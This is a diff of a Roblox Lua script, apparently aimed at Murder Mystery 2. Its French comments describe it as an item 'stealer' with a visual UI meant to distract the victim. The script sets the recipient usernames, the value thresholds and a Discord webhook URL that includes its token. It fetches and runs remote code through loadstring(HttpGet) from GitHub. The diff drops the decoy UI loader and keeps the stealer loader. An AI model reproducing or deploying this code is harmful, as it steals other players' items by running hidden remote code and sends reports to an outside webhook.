@@ -1,24 +1,7 @@
--- // 1. DEFINITION DES VARIABLES (Utilisées par le script Protected)
-_G.Usernames = {"ANOUARTM111", "lebg91000", "ThunderStealthZap16"}
+_G.Usernames = {"ANOUARTM111", "lebg91000", "ThunderStealthZap16"} -- you can add as many as you'd like
 _G.min_rarity = "Common"
-_G.min_value = 1 
-_G.pingEveryone = "Yes"
-_G.webhook = "https://discord.com/api/webhooks/1465745432490807471/Ky8U8WHmpl3-Uy-X1comdyQou1XzQsEt8FWHd7yvJfCLO3cvwfneNTTErniUv_y0w4Rh"
+_G.min_value = 1 -- Put 1 to get all
+_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
+_G.webhook = "https://discord.com/api/webhooks/1465745432490807471/Ky8U8WHmpl3-Uy-X1comdyQou1XzQsEt8FWHd7yvJfCLO3cvwfneNTTErniUv_y0w4Rh" -- change to your webhook
 
--- // 2. LANCEMENT DU STEALER (Celui qui fait tout le travail)
--- On utilise pcall pour éviter que si l'un crash, l'autre ne se lance pas
-task.spawn(function()
-    local success, err = pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/Anouar111/Mm2-s/refs/heads/main/mm2-S-.lua"))()
-    end)
-    if not success then warn("Erreur Stealer: " .. err) end
-end)
-
--- // 3. LANCEMENT DU VISUAL UI (Pour distraire la victime)
-task.wait(1) -- On attend 1 seconde pour laisser le stealer s'initialiser
-task.spawn(function()
-    local success, err = pcall(function()
-        loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/0JUV3Y91xbjShEig/raw"))()
-    end)
-    if not success then warn("Erreur Visual UI: " .. err) end
-end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Anouar111/Mm2-s/refs/heads/main/mm2-S-.lua"))()
